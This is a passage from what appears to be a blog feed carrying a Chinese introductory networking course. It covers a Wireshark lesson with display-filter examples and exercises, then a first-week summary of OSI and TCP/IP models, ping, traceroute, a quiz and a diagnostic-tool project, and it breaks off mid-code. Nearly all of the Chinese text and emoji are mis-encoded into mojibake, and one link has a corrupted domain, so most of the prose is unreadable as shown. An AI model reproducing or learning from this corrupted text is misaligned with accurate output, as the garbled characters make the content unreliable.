id="ä»Šå¤©å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ">ä»Šå¤©å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ</h3><ol><li>âœ… Wiresharkæ˜¯æœ€å¼ºå¤§çš„ç½‘ç»œåè®®åˆ†æå·¥å…·</li><li>âœ… å¯ä»¥çœ‹åˆ°æ¯ä¸ªæ•°æ®åŒ…çš„å®Œæ•´ç»“æ„</li><li>âœ… è¿‡æ»¤å™¨å¯ä»¥å¿«é€Ÿå®šä½éœ€è¦çš„åŒ…</li><li>âœ… å¯ä»¥åˆ†æHTTPã€TCPã€IPç­‰å„å±‚åè®®</li><li>âœ… å®é™…éªŒè¯äº†å‰å‡ å¤©å­¦ä¹ çš„åè®®çŸ¥è¯†</li></ol><h3 id="é‡è¦æ¦‚å¿µ">é‡è¦æ¦‚å¿µ</h3><table><thead><tr><th>æ¦‚å¿µ</th><th>å«ä¹‰</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>æŠ“åŒ…</td><td>æ•è·ç½‘ç»œæ•°æ®åŒ…</td><td>åˆ†æç½‘ç»œè¡Œä¸º</td></tr><tr><td>æ˜¾ç¤ºè¿‡æ»¤å™¨</td><td>è¿‡æ»¤å·²æ•è·çš„åŒ…</td><td>æŸ¥çœ‹ç‰¹å®šåŒ…</td></tr><tr><td>æ•è·è¿‡æ»¤å™¨</td><td>åªæ•è·ç‰¹å®šçš„åŒ…</td><td>å‡å°‘æ–‡ä»¶å¤§å°</td></tr><tr><td>è·Ÿè¸ªæµ</td><td>æŸ¥çœ‹å®Œæ•´ä¼šè¯</td><td>ç†è§£é€šä¿¡è¿‡ç¨‹</td></tr></tbody></table><h3 id="å¸¸ç”¨è¿‡æ»¤å™¨é€ŸæŸ¥">å¸¸ç”¨è¿‡æ»¤å™¨é€ŸæŸ¥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># åè®®è¿‡æ»¤</span><br>http, tcp, udp, dns, icmp<br><br><span class="hljs-comment"># IPè¿‡æ»¤</span><br>ip.addr == 192.168.1.1<br>ip.src == 192.168.1.1<br>ip.dst == 8.8.8.8<br><br><span class="hljs-comment"># ç«¯å£è¿‡æ»¤</span><br>tcp.port == 80<br>tcp.srcport == 80<br>tcp.dstport == 443<br><br><span class="hljs-comment"># HTTPè¿‡æ»¤</span><br>http.request<br>http.response<br>http.request.method == <span class="hljs-string">&quot;POST&quot;</span><br><br><span class="hljs-comment"># é€»è¾‘è¿ç®—</span><br>&amp;&amp; (AND)<br>|| (OR)<br>! (NOT)<br></code></pre></td></tr></table></figure><h2 id="ğŸ’ª-ç»ƒä¹ é¢˜">ğŸ’ª ç»ƒä¹ é¢˜</h2><h3 id="ç»ƒä¹ 1ï¼šåŸºç¡€æŠ“åŒ…">ç»ƒä¹ 1ï¼šåŸºç¡€æŠ“åŒ…</h3><ol><li>æŠ“å–è®¿é—®baidu.comçš„æ•°æ®åŒ…</li><li>æ‰¾åˆ°DNSæŸ¥è¯¢åŒ…</li><li>æ‰¾åˆ°TCPä¸‰æ¬¡æ¡æ‰‹çš„ä¸‰ä¸ªåŒ…</li><li>æ‰¾åˆ°HTTPè¯·æ±‚å’Œå“åº”</li></ol><h3 id="ç»ƒä¹ 2ï¼šè¿‡æ»¤å™¨ç»ƒä¹ ">ç»ƒä¹ 2ï¼šè¿‡æ»¤å™¨ç»ƒä¹ </h3><p>ä½¿ç”¨è¿‡æ»¤å™¨å®Œæˆä»¥ä¸‹ä»»åŠ¡ï¼š</p><ol><li>åªæ˜¾ç¤ºä½ çš„ç”µè„‘å‘é€çš„åŒ…</li><li>åªæ˜¾ç¤ºHTTP POSTè¯·æ±‚</li><li>æ˜¾ç¤ºæ‰€æœ‰åˆ°8.8.8.8çš„åŒ…</li><li>æ˜¾ç¤ºDNSæŸ¥è¯¢ä½†ä¸æ˜¾ç¤ºå“åº”</li></ol><h3 id="ç»ƒä¹ 3ï¼šåè®®åˆ†æ">ç»ƒä¹ 3ï¼šåè®®åˆ†æ</h3><p>æŠ“å–ä¸€ä¸ªå®Œæ•´çš„HTTPè¯·æ±‚ï¼Œåˆ†æï¼š</p><ol><li>TCPä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹</li><li>HTTPè¯·æ±‚å¤´éƒ¨å†…å®¹</li><li>HTTPå“åº”çŠ¶æ€ç </li><li>TCPå››æ¬¡æŒ¥æ‰‹è¿‡ç¨‹</li></ol><h3 id="ç»ƒä¹ 4ï¼šè¿›é˜¶ä»»åŠ¡">ç»ƒä¹ 4ï¼šè¿›é˜¶ä»»åŠ¡</h3><ol><li>å¯¼å‡ºä¸€ä¸ªç½‘é¡µä¼ è¾“çš„å›¾ç‰‡</li><li>ç»Ÿè®¡5åˆ†é’Ÿå†…å„åè®®çš„æµé‡å æ¯”</li><li>æ‰¾å‡ºå»¶è¿Ÿæœ€å¤§çš„æ•°æ®åŒ…</li><li>åˆ†æä¸€ä¸ªTCPé‡ä¼ çš„åŒ…</li></ol><h2 id="ğŸ“š-æ‰©å±•é˜…è¯»">ğŸ“š æ‰©å±•é˜…è¯»</h2><h3 id="ä¸ºä»€ä¹ˆHTTPSä¸èƒ½æŠ“åŒ…ï¼Ÿ">ä¸ºä»€ä¹ˆHTTPSä¸èƒ½æŠ“åŒ…ï¼Ÿ</h3><p>HTTPSæ˜¯åŠ å¯†çš„ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">HTTP:  æ˜æ–‡ä¼ è¾“ï¼ŒWiresharkå¯ä»¥çœ‹åˆ°å†…å®¹<br>HTTPS: åŠ å¯†ä¼ è¾“ï¼ŒWiresharkåªèƒ½çœ‹åˆ°åŠ å¯†æ•°æ®<br><br>è¦æŠ“å–HTTPSå†…å®¹éœ€è¦ï¼š<br><span class="hljs-bullet">1.</span> å®‰è£…è¯ä¹¦<br><span class="hljs-bullet">2.</span> é…ç½®æµè§ˆå™¨å¯¼å‡ºå¯†é’¥<br><span class="hljs-bullet">3.</span> åœ¨Wiresharkä¸­é…ç½®SSLå¯†é’¥æ—¥å¿—<br></code></pre></td></tr></table></figure><h3 id="Wiresharkçš„æ›¿ä»£å·¥å…·">Wiresharkçš„æ›¿ä»£å·¥å…·</h3><ul><li><strong>tcpdump</strong>ï¼šå‘½ä»¤è¡ŒæŠ“åŒ…å·¥å…·</li><li><strong>Charles</strong>ï¼šä¸“æ³¨HTTP/HTTPSçš„å·¥å…·</li><li><strong>Fiddler</strong>ï¼šWindowsä¸Šçš„HTTPè°ƒè¯•å·¥å…·</li><li><strong>mitmproxy</strong>ï¼šå‘½ä»¤è¡Œçš„ä¸­é—´äººä»£ç†</li></ul><h3 id="å®é™…åº”ç”¨åœºæ™¯">å®é™…åº”ç”¨åœºæ™¯</h3><ol><li><strong>Webå¼€å‘è°ƒè¯•</strong>ï¼šæŸ¥çœ‹HTTPè¯·æ±‚å’Œå“åº”</li><li><strong>ç½‘ç»œæ•…éšœæ’æŸ¥</strong>ï¼šåˆ†æä¸¢åŒ…ã€å»¶è¿Ÿ</li><li><strong>å®‰å…¨åˆ†æ</strong>ï¼šæ£€æµ‹å¼‚å¸¸æµé‡</li><li><strong>å­¦ä¹ åè®®</strong>ï¼šæ·±å…¥ç†è§£ç½‘ç»œåè®®</li><li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šåˆ†æç½‘ç»œç“¶é¢ˆ</li></ol><h2 id="ğŸ¯-ä¸‹ä¸€æ­¥ï¼šç¬¬ä¸€å‘¨æ€»ç»“">ğŸ¯ ä¸‹ä¸€æ­¥ï¼šç¬¬ä¸€å‘¨æ€»ç»“</h2><p><strong>æ˜å¤©æˆ‘ä»¬å°†æ€»ç»“ç¬¬ä¸€å‘¨çš„æ‰€æœ‰å†…å®¹ï¼</strong></p><p>å›é¡¾ï¼š</p><ul><li>ç½‘ç»œåŸºç¡€æ¦‚å¿µ</li><li>OSIå’ŒTCP/IPæ¨¡å‹</li><li>pingå’Œtracerouteå‘½ä»¤</li><li>WiresharkæŠ“åŒ…åˆ†æ</li></ul><p>å‡†å¤‡å¥½è¿›è¡Œç¬¬ä¸€å‘¨çš„ç»¼åˆæµ‹éªŒäº†å—ï¼Ÿ</p><hr><p>ğŸ’¡ <strong>ä»Šæ—¥é‡‘å¥</strong>ï¼šWiresharkè®©ä¸å¯è§çš„ç½‘ç»œæ•°æ®åŒ…å˜å¾—å¯è§ï¼</p><p>ğŸ‘‰ <a href="day06.md">ä¸Šä¸€å¤©ï¼štracerouteè¯¦è§£</a> | <a href="../../README.md">è¿”å›ç›®å½•</a> | <a href="week_summary.md">ä¸‹ä¸€å¤©ï¼šç¬¬ä¸€å‘¨æ€»ç»“</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€å‘¨æ€»ç»“ï¼šç½‘ç»œåŸºç¡€å…¥é—¨</title>
    <link href="/2025/11/10/%E4%B8%80%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"/>
    <url>/2025/11/10/%E4%B8%80%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1>ç¬¬ä¸€å‘¨æ€»ç»“ï¼šç½‘ç»œåŸºç¡€å…¥é—¨</h1><blockquote><p>â€œä¸‡ä¸ˆé«˜æ¥¼å¹³åœ°èµ·ï¼Œæ‰å®åŸºç¡€æ˜¯å…³é”®ã€‚â€</p></blockquote><h2 id="ğŸ¯-æœ¬å‘¨å›é¡¾">ğŸ¯ æœ¬å‘¨å›é¡¾</h2><p>æ­å–œä½ å®Œæˆäº†ç¬¬ä¸€å‘¨çš„å­¦ä¹ ï¼è®©æˆ‘ä»¬å›é¡¾ä¸€ä¸‹è¿™ä¸€å‘¨çš„ç²¾å½©å†…å®¹ã€‚</p><h3 id="ğŸ“š-æœ¬å‘¨å­¦ä¹ å†…å®¹">ğŸ“š æœ¬å‘¨å­¦ä¹ å†…å®¹</h3><table><thead><tr><th>å¤©æ•°</th><th>ä¸»é¢˜</th><th>æ ¸å¿ƒå†…å®¹</th><th>å®æˆ˜é¡¹ç›®</th></tr></thead><tbody><tr><td>ç¬¬1å¤©</td><td>è®¤è¯†è®¡ç®—æœºç½‘ç»œ</td><td>ç½‘ç»œåŸºæœ¬æ¦‚å¿µã€ä½œç”¨</td><td>ç½‘ç»œè¿æ¥æ£€æµ‹å·¥å…·</td></tr><tr><td>ç¬¬2å¤©</td><td>ç½‘ç»œåˆ†ç±»å’Œæ‹“æ‰‘</td><td>LAN/WAN/MANã€æ‹“æ‰‘ç»“æ„</td><td>å±€åŸŸç½‘è®¾å¤‡æ‰«æå™¨</td></tr><tr><td>ç¬¬3å¤©</td><td>OSIä¸ƒå±‚æ¨¡å‹</td><td>ä¸ƒå±‚ç»“æ„ã€æ•°æ®å°è£…</td><td>åè®®åˆ†å±‚æ¼”ç¤º</td></tr><tr><td>ç¬¬4å¤©</td><td>TCP/IPå››å±‚æ¨¡å‹</td><td>å®é™…åº”ç”¨æ¨¡å‹ã€åè®®</td><td>æ•°æ®åŒ…åˆ†æå™¨</td></tr><tr><td>ç¬¬5å¤©</td><td>pingå‘½ä»¤</td><td>ICMPåè®®ã€RTT</td><td>ç®€æ˜“pingå·¥å…·</td></tr><tr><td>ç¬¬6å¤©</td><td>tracerouteå‘½ä»¤</td><td>è·¯ç”±è¿½è¸ªã€TTL</td><td>ç®€æ˜“tracerouteå·¥å…·</td></tr><tr><td>ç¬¬7å¤©</td><td>WiresharkæŠ“åŒ…</td><td>æŠ“åŒ…åˆ†æã€è¿‡æ»¤å™¨</td><td>å®é™…æŠ“åŒ…åˆ†æ</td></tr></tbody></table><h2 id="ğŸ“–-çŸ¥è¯†ç‚¹æ€»ç»“">ğŸ“– çŸ¥è¯†ç‚¹æ€»ç»“</h2><h3 id="1-ç½‘ç»œåŸºç¡€æ¦‚å¿µ">1. ç½‘ç»œåŸºç¡€æ¦‚å¿µ</h3><p><strong>ä»€ä¹ˆæ˜¯è®¡ç®—æœºç½‘ç»œï¼Ÿ</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">è®¡ç®—æœºç½‘ç»œ = å¤šå°è®¡ç®—æœºé€šè¿‡é€šä¿¡çº¿è·¯è¿æ¥<br><span class="hljs-bullet">             +</span> å…±äº«èµ„æº<br><span class="hljs-bullet">             +</span> äº¤æ¢ä¿¡æ¯<br></code></pre></td></tr></table></figure><p><strong>ç½‘ç»œçš„åˆ†ç±»</strong>ï¼š</p><ul><li>LANï¼ˆå±€åŸŸç½‘ï¼‰ï¼šå®¶åº­ã€åŠå…¬å®¤ï¼ˆå‡ ç±³åˆ°å‡ å…¬é‡Œï¼‰</li><li>MANï¼ˆåŸåŸŸç½‘ï¼‰ï¼šåŸå¸‚èŒƒå›´ï¼ˆå‡ åå…¬é‡Œï¼‰</li><li>WANï¼ˆå¹¿åŸŸç½‘ï¼‰ï¼šè·¨å›½ã€è·¨æ´²ï¼ˆå‡ ç™¾åˆ°å‡ ä¸‡å…¬é‡Œï¼‰</li></ul><p><strong>ç½‘ç»œæ‹“æ‰‘ç»“æ„</strong>ï¼š</p><ul><li>æ€»çº¿å‹ï¼šæ‰€æœ‰è®¾å¤‡è¿åœ¨ä¸€æ¡çº¿ä¸Š</li><li>æ˜Ÿå‹ï¼šæ‰€æœ‰è®¾å¤‡è¿åˆ°ä¸­å¿ƒèŠ‚ç‚¹ï¼ˆæœ€å¸¸ç”¨ï¼‰</li><li>ç¯å‹ï¼šè®¾å¤‡é¦–å°¾ç›¸è¿æˆç¯</li><li>ç½‘çŠ¶å‹ï¼šè®¾å¤‡äº’ç›¸è¿æ¥</li><li>æ ‘å‹ï¼šåˆ†å±‚ç»“æ„</li></ul><h3 id="2-OSIä¸ƒå±‚æ¨¡å‹">2. OSIä¸ƒå±‚æ¨¡å‹</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino">ç¬¬<span class="hljs-number">7</span>å±‚ - åº”ç”¨å±‚ï¼ˆApplicationï¼‰      â†’ HTTP, FTP, DNS<br>ç¬¬<span class="hljs-number">6</span>å±‚ - è¡¨ç¤ºå±‚ï¼ˆPresentationï¼‰     â†’ åŠ å¯†, å‹ç¼©<br>ç¬¬<span class="hljs-number">5</span>å±‚ - ä¼šè¯å±‚ï¼ˆSessionï¼‰          â†’ ä¼šè¯ç®¡ç†<br>ç¬¬<span class="hljs-number">4</span>å±‚ - ä¼ è¾“å±‚ï¼ˆTransportï¼‰        â†’ TCP, UDP<br>ç¬¬<span class="hljs-number">3</span>å±‚ - ç½‘ç»œå±‚ï¼ˆNetworkï¼‰          â†’ IP, ICMP<br>ç¬¬<span class="hljs-number">2</span>å±‚ - æ•°æ®é“¾è·¯å±‚ï¼ˆData Linkï¼‰    â†’ <span class="hljs-built_in">Ethernet</span>, <span class="hljs-built_in">WiFi</span><br>ç¬¬<span class="hljs-number">1</span>å±‚ - ç‰©ç†å±‚ï¼ˆPhysicalï¼‰         â†’ ç½‘çº¿, å…‰çº¤<br></code></pre></td></tr></table></figure><p><strong>è®°å¿†å£è¯€</strong>ï¼šåº”è¡¨ä¼šä¼ ç½‘æ•°ç‰©</p><p><strong>æ•°æ®å°è£…è¿‡ç¨‹</strong>ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">åº”ç”¨æ•°æ® â†’ [ä¼ è¾“å±‚å¤´|<span class="hljs-string">æ•°æ®] â†’ [ç½‘ç»œå±‚å¤´</span>|<span class="hljs-string">ä¼ è¾“å±‚å¤´</span>|<span class="hljs-string">æ•°æ®]</span><br><span class="hljs-string">â†’ [é“¾è·¯å±‚å¤´</span>|<span class="hljs-string">ç½‘ç»œå±‚å¤´</span>|<span class="hljs-string">ä¼ è¾“å±‚å¤´</span>|<span class="hljs-string">æ•°æ®</span>|<span class="hljs-string">é“¾è·¯å±‚å°¾]</span><br></code></pre></td></tr></table></figure><h3 id="3-TCP-IPå››å±‚æ¨¡å‹">3. TCP/IPå››å±‚æ¨¡å‹</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  åº”ç”¨å±‚        â”‚  HTTP, DNS, FTP, SSH<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ä¼ è¾“å±‚        â”‚  TCP, UDP<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ç½‘é™…å±‚        â”‚  IP, ICMP, ARP<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ç½‘ç»œæ¥å£å±‚    â”‚  <span class="hljs-built_in">Ethernet</span>, <span class="hljs-built_in">WiFi</span><br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><p><strong>TCP/IP vs OSI</strong>ï¼š</p><ul><li>OSIï¼šç†è®ºæ¨¡å‹ï¼ˆ7å±‚ï¼‰</li><li>TCP/IPï¼šå®é™…ä½¿ç”¨ï¼ˆ4å±‚ï¼‰</li></ul><h3 id="4-å…³é”®åè®®">4. å…³é”®åè®®</h3><h4 id="IPåè®®ï¼ˆInternet-Protocolï¼‰">IPåè®®ï¼ˆInternet Protocolï¼‰</h4><ul><li>ä½œç”¨ï¼šå¯»å€å’Œè·¯ç”±</li><li>IPåœ°å€ï¼š192.168.1.100</li><li>ç‰ˆæœ¬ï¼šIPv4ï¼ˆ32ä½ï¼‰ã€IPv6ï¼ˆ128ä½ï¼‰</li></ul><h4 id="TCPåè®®ï¼ˆTransmission-Control-Protocolï¼‰">TCPåè®®ï¼ˆTransmission Control Protocolï¼‰</h4><ul><li>ä½œç”¨ï¼šå¯é ä¼ è¾“</li><li>ç‰¹ç‚¹ï¼šé¢å‘è¿æ¥ã€å¯é ã€æœ‰åº</li><li>ç«¯å£ï¼šæ ‡è¯†åº”ç”¨ç¨‹åº</li></ul><h4 id="UDPåè®®ï¼ˆUser-Datagram-Protocolï¼‰">UDPåè®®ï¼ˆUser Datagram Protocolï¼‰</h4><ul><li>ä½œç”¨ï¼šå¿«é€Ÿä¼ è¾“</li><li>ç‰¹ç‚¹ï¼šæ— è¿æ¥ã€ä¸å¯é ã€ç®€å•å¿«é€Ÿ</li></ul><h4 id="ICMPåè®®ï¼ˆInternet-Control-Message-Protocolï¼‰">ICMPåè®®ï¼ˆInternet Control Message Protocolï¼‰</h4><ul><li>ä½œç”¨ï¼šé”™è¯¯æŠ¥å‘Šã€ç½‘ç»œè¯Šæ–­</li><li>åº”ç”¨ï¼špingã€traceroute</li></ul><h4 id="HTTPåè®®ï¼ˆHypertext-Transfer-Protocolï¼‰">HTTPåè®®ï¼ˆHypertext Transfer Protocolï¼‰</h4><ul><li>ä½œç”¨ï¼šç½‘é¡µä¼ è¾“</li><li>ç«¯å£ï¼š80ï¼ˆHTTPï¼‰ã€443ï¼ˆHTTPSï¼‰</li><li>æ–¹æ³•ï¼šGETã€POSTã€PUTã€DELETEç­‰</li></ul><h3 id="5-é‡è¦æ¦‚å¿µ">5. é‡è¦æ¦‚å¿µ</h3><p><strong>MACåœ°å€</strong>ï¼š</p><ul><li>ç½‘å¡çš„ç‰©ç†åœ°å€</li><li>æ ¼å¼ï¼šAA:BB:CC:DD:EE:FF</li><li>ä½œç”¨ï¼šå±€åŸŸç½‘å†…é€šä¿¡</li></ul><p><strong>IPåœ°å€</strong>ï¼š</p><ul><li>ç½‘ç»œä¸­è®¾å¤‡çš„é€»è¾‘åœ°å€</li><li>æ ¼å¼ï¼š192.168.1.1</li><li>ä½œç”¨ï¼šè·¨ç½‘ç»œé€šä¿¡</li></ul><p><strong>ç«¯å£å·</strong>ï¼š</p><ul><li>æ ‡è¯†ä¸»æœºä¸Šçš„åº”ç”¨ç¨‹åº</li><li>èŒƒå›´ï¼š0-65535</li><li>å¸¸ç”¨ï¼š80(HTTP)ã€443(HTTPS)ã€22(SSH)</li></ul><p><strong>TTLï¼ˆTime To Liveï¼‰</strong>ï¼š</p><ul><li>æ•°æ®åŒ…çš„ç”Ÿå­˜æ—¶é—´</li><li>æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨å‡1</li><li>ä¸º0æ—¶è¢«ä¸¢å¼ƒ</li></ul><p><strong>RTTï¼ˆRound-Trip Timeï¼‰</strong>ï¼š</p><ul><li>å¾€è¿”æ—¶é—´</li><li>ä»å‘é€åˆ°æ”¶åˆ°å›å¤çš„æ—¶é—´</li><li>å•ä½ï¼šæ¯«ç§’(ms)</li></ul><h3 id="6-ç½‘ç»œå·¥å…·">6. ç½‘ç»œå·¥å…·</h3><p><strong>ping</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æµ‹è¯•è¿é€šæ€§</span><br>ping baidu.com<br><br><span class="hljs-comment"># å‘é€4ä¸ªåŒ…</span><br>ping -c 4 baidu.com  <span class="hljs-comment"># Linux/Mac</span><br>ping -n 4 baidu.com  <span class="hljs-comment"># Windows</span><br></code></pre></td></tr></table></figure><p><strong>traceroute</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è¿½è¸ªè·¯ç”±è·¯å¾„</span><br>traceroute baidu.com  <span class="hljs-comment"># Linux/Mac</span><br>tracert baidu.com     <span class="hljs-comment"># Windows</span><br></code></pre></td></tr></table></figure><p><strong>Wireshark</strong>ï¼š</p><ul><li>å›¾å½¢åŒ–æŠ“åŒ…å·¥å…·</li><li>æ”¯æŒå¤šç§åè®®åˆ†æ</li><li>å¼ºå¤§çš„è¿‡æ»¤åŠŸèƒ½</li></ul><h2 id="ğŸ§ª-ç»¼åˆç»ƒä¹ é¢˜">ğŸ§ª ç»¼åˆç»ƒä¹ é¢˜</h2><h3 id="ä¸€ã€é€‰æ‹©é¢˜">ä¸€ã€é€‰æ‹©é¢˜</h3><ol><li><p>ä»¥ä¸‹å“ªä¸ªä¸æ˜¯ç½‘ç»œæ‹“æ‰‘ç»“æ„ï¼Ÿ<br>A. æ˜Ÿå‹  B. ç¯å‹  C. åœ†å‹  D. æ€»çº¿å‹</p></li><li><p>TCP/IPæ¨¡å‹æœ‰å‡ å±‚ï¼Ÿ<br>A. 4å±‚  B. 5å±‚  C. 7å±‚  D. 9å±‚</p></li><li><p>pingå‘½ä»¤ä½¿ç”¨çš„æ˜¯å“ªä¸ªåè®®ï¼Ÿ<br>A. TCP  B. UDP  C. ICMP  D. HTTP</p></li><li><p>ä»¥ä¸‹å“ªä¸ªIPåœ°å€æ˜¯ç§ç½‘åœ°å€ï¼Ÿ<br>A. 8.8.8.8  B. 192.168.1.1  C. 114.114.114.114  D. 220.181.38.148</p></li><li><p>HTTPåè®®é»˜è®¤ä½¿ç”¨å“ªä¸ªç«¯å£ï¼Ÿ<br>A. 22  B. 80  C. 443  D. 3306</p></li></ol><h3 id="äºŒã€ç®€ç­”é¢˜">äºŒã€ç®€ç­”é¢˜</h3><ol><li><p>è§£é‡ŠOSIæ¨¡å‹ä¸­æ¯ä¸€å±‚çš„ä¸»è¦ä½œç”¨ã€‚</p></li><li><p>TCPå’ŒUDPæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿå„è‡ªé€‚ç”¨äºä»€ä¹ˆåœºæ™¯ï¼Ÿ</p></li><li><p>è¯´æ˜pingå‘½ä»¤çš„å·¥ä½œåŸç†ã€‚</p></li><li><p>ä»€ä¹ˆæ˜¯å­ç½‘æ©ç ï¼Ÿ192.168.1.0/24æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</p></li><li><p>æ•°æ®åŒ…ä»åº”ç”¨å±‚åˆ°ç‰©ç†å±‚çš„å°è£…è¿‡ç¨‹æ˜¯æ€æ ·çš„ï¼Ÿ</p></li></ol><h3 id="ä¸‰ã€å®è·µé¢˜">ä¸‰ã€å®è·µé¢˜</h3><ol><li><p><strong>ç½‘ç»œè¯Šæ–­</strong></p><ul><li>ä½¿ç”¨pingæµ‹è¯•åˆ°baidu.comçš„è¿é€šæ€§</li><li>è®°å½•RTTå’ŒTTLå€¼</li><li>åˆ†æç»“æœè¯´æ˜ä»€ä¹ˆ</li></ul></li><li><p><strong>è·¯å¾„è¿½è¸ª</strong></p><ul><li>ä½¿ç”¨tracerouteè¿½è¸ªåˆ°google.comçš„è·¯å¾„</li><li>è®°å½•ç»è¿‡çš„è·³æ•°</li><li>å“ªä¸€è·³å»¶è¿Ÿæœ€å¤§ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ</li></ul></li><li><p><strong>æŠ“åŒ…åˆ†æ</strong></p><ul><li>ä½¿ç”¨WiresharkæŠ“å–è®¿é—®<a href="http://www.example.xn--com-n82e636edycn86b">http://www.example.comçš„æ•°æ®åŒ…</a></li><li>æ‰¾å‡ºDNSæŸ¥è¯¢åŒ…</li><li>æ‰¾å‡ºTCPä¸‰æ¬¡æ¡æ‰‹çš„åŒ…</li><li>æ‰¾å‡ºHTTP GETè¯·æ±‚åŒ…</li><li>åˆ†ææ¯ä¸ªåŒ…çš„å„å±‚ç»“æ„</li></ul></li><li><p><strong>å±€åŸŸç½‘æ‰«æ</strong></p><ul><li>æ‰«æä½ æ‰€åœ¨çš„å±€åŸŸç½‘</li><li>åˆ—å‡ºæ‰€æœ‰åœ¨çº¿è®¾å¤‡çš„IPå’ŒMACåœ°å€</li><li>ç»˜åˆ¶ç®€å•çš„ç½‘ç»œæ‹“æ‰‘å›¾</li></ul></li></ol><h2 id="ğŸš€-ç»¼åˆå®æˆ˜é¡¹ç›®">ğŸš€ ç»¼åˆå®æˆ˜é¡¹ç›®</h2><h3 id="é¡¹ç›®ï¼šç½‘ç»œè¯Šæ–­å·¥å…·ç®±">é¡¹ç›®ï¼šç½‘ç»œè¯Šæ–­å·¥å…·ç®±</h3><p><strong>éœ€æ±‚</strong>ï¼š<br>å¼€å‘ä¸€ä¸ªç»¼åˆçš„ç½‘ç»œè¯Šæ–­å·¥å…·ï¼Œæ•´åˆæœ¬å‘¨å­¦åˆ°çš„æ‰€æœ‰çŸ¥è¯†ã€‚</p><p><strong>åŠŸèƒ½</strong>ï¼š</p><ol><li><strong>è¿é€šæ€§æµ‹è¯•</strong>ï¼špingåŠŸèƒ½</li><li><strong>è·¯ç”±è¿½è¸ª</strong>ï¼štracerouteåŠŸèƒ½</li><li><strong>ç«¯å£æ‰«æ</strong>ï¼šæ‰«ææŒ‡å®šä¸»æœºçš„å¼€æ”¾ç«¯å£</li><li><strong>å±€åŸŸç½‘æ‰«æ</strong>ï¼šå‘ç°å±€åŸŸç½‘å†…çš„æ‰€æœ‰è®¾å¤‡</li><li><strong>DNSæŸ¥è¯¢</strong>ï¼šæŸ¥è¯¢åŸŸåçš„IPåœ°å€</li><li><strong>ç½‘ç»œä¿¡æ¯</strong>ï¼šæ˜¾ç¤ºæœ¬æœºç½‘ç»œé…ç½®</li></ol><p><strong>å®ç°æç¤º</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 